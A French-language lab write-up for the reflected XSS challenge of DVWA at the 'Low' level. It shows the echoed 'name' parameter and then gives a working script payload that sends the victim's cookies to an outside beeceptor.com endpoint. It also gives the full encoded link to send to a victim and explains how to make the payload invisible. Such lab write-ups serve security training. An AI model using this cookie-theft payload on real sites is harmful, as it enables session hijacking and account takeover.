# Niveau "Low"

Sur ce challenge, un simple formulaire permettant de saisir son nom :

![](../../../../.gitbook/assets/bbf16dde4020a8d2d1fe14407f9a86a6.png)

Le paramètre **`GET`** nommé `name` est simplement réfléchi sur la page :

![](../../../../.gitbook/assets/0f1ab9498e89d4b6ab5e5aad787c2e10.png)

Tentons une simple `alert()` box  :

![](../../../../.gitbook/assets/f3a8c7198442aeed07b360f1edb5fd49.png)

Il ne reste plus qu'a forger un lien exécutant un script envoyant les cookies de la victime sur un serveur malicieux :

```javascript
<script>document.write('<img src="https://dvwaxssrefl.free.beeceptor.com?cookie=' + document.cookie + '" />')</script>
```

![](../../../../.gitbook/assets/bf16bb33a4bc0fb6c35065e43d4c62be.png)

L'URL complète à soumettre à la victime est :

```http
http://192.168.56.203:8080/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.write%28%27%3Cimg+src%3D%22https%3A%2F%2Fdvwaxssrefl.free.beeceptor.com%3Fcookie%3D%27+%2B+document.cookie+%2B+%27%22+%2F%3E%27%29%3C%2Fscript%3E
```

L'exécution de la payload sera invisible pour la victime \(concernant l'icone de l'image, il suffira de renseigner une taille à 0\) :

![](../../../../.gitbook/assets/72061dc6e01cd1e4dec722d83662e405.png)

Côté attaquant, nous recevons la valeur des cookies lors du chargement de l'image \(par notre victime\) :

![](../../../../.gitbook/assets/f07926511e14747e755e5538516e2c02.png)

{% hint style="info" %}
J'utilise ici le service [beeceptor.com](https://beeceptor.com/) mais il est bien sur possible d'utiliser son propre serveur malicieux à partir du moment qu'il est possible d visualiser les requêtes effectuées
{% endhint %}

